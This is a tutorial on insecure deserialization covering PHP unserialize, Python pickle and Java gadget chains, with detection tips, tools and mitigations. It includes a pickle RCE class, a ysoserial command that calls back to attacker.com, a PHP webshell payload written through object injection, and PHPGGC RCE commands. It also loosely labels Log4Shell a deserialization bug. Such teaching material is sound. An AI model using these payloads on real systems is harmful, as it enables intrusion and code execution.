# Insecure Deserialization

## What Is It?

**Serialization** transforms an in-memory object into a storable or transmittable format (byte stream, string, or binary blob). **Deserialization** is the inverse — reconstructing the object from that format.

Applications serialize and deserialize data constantly: session tokens, API payloads, caches, inter-service messages. The vulnerability arises when an application deserializes data from an untrusted source without validating it first, allowing an attacker to supply a crafted payload that manipulates the deserialization process itself.

High-profile examples of insecure deserialization include the **Log4Shell** vulnerability and numerous **WebLogic RCE** CVEs — both resulted in unauthenticated remote code execution at scale.

---

## Language Implementations

### PHP

PHP serializes with `serialize()` and deserializes with `unserialize()`.

**Example serialized object:**
```
O:5:"Notes":1:{s:7:"content";s:11:"Hello World";}
```

Parsing this format:
- `O:5:"Notes":1:` — Object of class `Notes`, with 1 property
- `s:7:"content"` — String property named `content` (7 characters)
- `s:11:"Hello World"` — String value `Hello World` (11 characters)
- Data types: `s` = string, `i` = integer, `b` = boolean, `a` = array, `O` = object

**Attack surface:** PHP classes with `__wakeup()` or `__destruct()` magic methods are called automatically during deserialization. If these methods perform dangerous operations (file writes, eval, shell execution) with attacker-controlled properties, they become a gadget for code execution.

### Python (Pickle)

Python's `pickle` module serializes objects to binary format. A critical property of pickle: the serialized format can include **opcodes that execute arbitrary Python code** during deserialization.

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# Deserializing this payload executes os.system('whoami')
```

Because pickle data is binary, it is commonly base64-encoded before transmission. **Any base64-encoded cookie or parameter that decodes to binary data is worth testing for pickle deserialization.**

### Java

Java serialization uses `ObjectInputStream.readObject()`. Exploitation typically relies on **gadget chains** — sequences of classes present in the application's classpath whose methods, when called in a specific order during deserialization, result in code execution.

The **ysoserial** tool provides pre-built gadget chains for common Java libraries (Commons Collections, Spring, etc.).

```bash
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/callback' > payload.ser
```

---

## Identifying Deserialization Vulnerabilities

When source code is unavailable, look for these indicators:

### Error Messages
Stack traces referencing `unserialize()`, `readObject()`, or `pickle.loads()` confirm deserialization is occurring and may leak class names useful for crafting payloads.

### Cookie Analysis
Cookies often carry serialized session data. Common patterns:

| Pattern | Likely Technology |
|---------|------------------|
| `rO0AB...` (base64) | Java serialized object |
| `O:` after base64 decode | PHP serialized object |
| Binary data after base64 decode | Python pickle |
| `eyJ...` (base64) | JSON (usually JWT) |

```bash
# Decode and inspect a suspicious cookie
echo "COOKIE_VALUE" | base64 -d | xxd | head
```

### Unexpected Behavior on Input Modification
Modifying a serialized value (even slightly) and observing application errors, delays, or different responses suggests the value is being deserialized.

---

## Object Injection

PHP object injection exploits the magic method execution behavior of `unserialize()`. The attack requires:

1. A class in the application's codebase with a dangerous `__wakeup()` or `__destruct()` method
2. The ability to control the serialized data passed to `unserialize()`

**Example vulnerable pattern:**
```php
class FileLogger {
    public $filename;
    public $data;
    
    public function __destruct() {
        file_put_contents($this->filename, $this->data);
    }
}

$obj = unserialize($_COOKIE['session']);
```

An attacker who can control the `session` cookie can craft a `FileLogger` object with `filename=/var/www/html/shell.php` and `data=<?php system($_GET['cmd']); ?>`, writing a webshell on deserialization.

---

## Exploitation Tools

| Tool | Language | Purpose |
|------|----------|---------|
| [ysoserial](https://github.com/frohoff/ysoserial) | Java | Generates Java deserialization payloads for common gadget chains |
| [PHPGGC](https://github.com/ambionics/phpggc) | PHP | Gadget chain library for PHP frameworks (Laravel, Symfony, Yii, etc.) |
| [pickle-tools](https://github.com/) | Python | Crafting malicious pickle payloads |

**PHPGGC usage example:**
```bash
# List available gadget chains for Laravel
phpggc -l Laravel

# Generate a payload for RCE
phpggc Laravel/RCE1 system whoami | base64
```

---

## Mitigations

| Control | Description |
|---------|-------------|
| Avoid native serialization for untrusted data | Use JSON or XML instead of language-native formats for data that crosses a trust boundary |
| Validate before deserializing | Check data integrity with an HMAC before passing to the deserializer |
| Use safe deserialization libraries | Libraries that whitelist expected classes and reject unexpected ones |
| Disable `eval()` | Reduces the blast radius of successful object injection |
| Input validation and output encoding | Defense-in-depth — won't prevent deserialization vulns but limits other attack surface |
| Monitor for deserialization errors | Unexpected `ClassNotFoundException` or `InvalidClassException` in Java logs may indicate probing |
